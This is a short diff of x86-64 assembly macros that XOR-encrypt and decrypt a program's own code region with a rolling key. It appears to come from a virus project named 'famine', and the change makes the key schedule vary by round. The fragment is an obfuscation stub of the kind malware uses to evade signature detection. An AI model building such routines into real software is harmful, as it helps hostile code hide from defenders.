@@ -91,13 +91,15 @@
 	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
 	mov rcx, enc_end
 	sub rcx, rax
+	mov r12, STACK(famine.factor)
 	.cyphering:
 		mov r11b, byte [rdx]
 		xor r11, rdi
 		mov byte [rdx], r11b
 		inc rdx
-		add rdi, STACK(famine.factor)
-		loop .cyphering
+		dec r12
+		add rdi, r12
+	loop .cyphering
 %endmacro
 
 %macro DECYPHER 0
@@ -107,12 +109,14 @@
 	lea rdx, [rel .enc_start]
 	mov rcx, enc_end
 	sub rcx, rax
+	mov r12, 0xAA
 	.decyphering:
 		mov r11b, byte [rdx]
 		xor r11, rdi
 		mov byte [rdx], r11b
 		inc rdx
-		add rdi, 0xAA
+		dec r12
+		add rdi, r12
 		loop .decyphering
 %endmacro
 ;Structures
